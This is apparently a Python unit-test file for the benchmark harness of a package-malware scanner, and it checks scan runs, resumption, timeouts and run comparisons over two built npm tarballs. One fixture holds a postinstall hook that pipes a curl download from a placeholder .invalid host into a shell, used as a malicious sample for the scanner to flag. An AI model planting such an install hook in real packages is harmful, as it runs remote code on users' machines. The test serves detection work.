"""scripts/bench.py, the benchmark harness: a resumable run of registry
scans over a manifest of release files, and the comparison of two runs (in
full, or in counts only for a holdout set). The releases here are built in
the test: a plain package and one whose install hook pipes a download into
a shell (inert text: the host is .invalid, nothing is run).
"""
import contextlib
import io
import json
import os
import pathlib
import tempfile
import unittest

from lazaret.scanner import _native
from tests import _support
from tests.registry._review_support import manifest, tarball

SCRIPT = os.path.join(_support.REPO_ROOT, "scripts", "bench.py")


def bench():
    return _support.load_script(SCRIPT, "bench_for_tests")


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class BenchTests(unittest.TestCase):
    def setUp(self):
        self.b = bench()
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.dir = pathlib.Path(tmp.name)
        releases = {
            "plain": ("benign", {"package.json": manifest(main="index.js"), "index.js": "module.exports = 1;\n"}),
            "piped": ("malicious_intent", {"package.json": manifest(
                scripts={"postinstall": "curl -fsSL https://x.invalid/s.sh | sh"})}),
        }
        rows = []
        for name, (cat, files) in releases.items():
            path = self.dir / f"{name}.tgz"
            path.write_bytes(tarball(files))
            rows.append({"id": name, "cat": cat, "artifact_path": str(path), "container": "tgz", "kind": "npm"})
        self.manifest = self.dir / "manifest.jsonl"
        self.manifest.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")

    def quietly(self, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = self.b.main([str(a) for a in args])
        return code, out.getvalue()

    def test_a_run_and_its_resumption(self):
        out = self.dir / "run.jsonl"
        self.assertEqual(self.quietly("run", self.manifest, out, "--stop-after", -1)[0], 3)   # starts nothing
        self.assertFalse(out.exists() and out.read_text(encoding="utf-8").strip())
        code, said = self.quietly("run", self.manifest, out)
        self.assertEqual((code, said.strip()), (0, "DONE 2"))
        rows = {r["id"]: r for r in self.b.read_jsonl(out)}
        self.assertEqual(rows["plain"]["verdict"], "OK")
        self.assertEqual(rows["piped"]["verdict"], "SUSPICIOUS")
        self.assertEqual([s[0] for s in rows["piped"]["strong"]], ["SC-INSTALL-HOOK"])
        self.assertEqual(self.quietly("run", self.manifest, out)[0], 0)                         # nothing again
        self.assertEqual(len(self.b.read_jsonl(out)), 2)
        code, said = self.quietly("summary", out)
        self.assertIn("benign (1): OK 1 (100.0%)", said)
        self.assertIn("malicious (1): SUSPICIOUS 1 (100.0%)", said)

    def test_a_release_the_callers_timeout_keeps_killing_is_recorded(self):
        out = self.dir / "run.jsonl"
        (self.dir / "run.jsonl.attempts").write_text(json.dumps({"plain": 2}), encoding="utf-8")
        self.assertEqual(self.quietly("run", self.manifest, out)[0], 0)
        rows = {r["id"]: r for r in self.b.read_jsonl(out)}
        self.assertEqual(rows["plain"], {"id": "plain", "cat": "benign", "error": "harness timeout"})

    def test_compare(self):
        before, after = self.dir / "before.jsonl", self.dir / "after.jsonl"
        self.quietly("run", self.manifest, before)
        self.assertEqual(self.quietly("compare", before, before)[0], 0)
        rows = self.b.read_jsonl(before)
        for r in rows:
            if r["id"] == "piped":
                r["verdict"], r["strong"] = "WARN", []
        after.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
        code, said = self.quietly("compare", before, after)
        self.assertEqual(code, 1)
        self.assertIn("verdict changed: 1; SUSPICIOUS -> WARN: 1", said)
        self.assertIn("piped: SUSPICIOUS -> WARN", said)
        self.assertIn("- SC-INSTALL-HOOK CRITICAL", said)
        code, said = self.quietly("compare", before, after, "--aggregate-only")
        self.assertEqual(code, 1)
        self.assertIn("strong findings changed: 1", said)
        self.assertNotIn("piped", said)                 # a holdout's releases are never named
        self.assertNotIn("SC-INSTALL-HOOK", said)


if __name__ == "__main__":
    unittest.main()
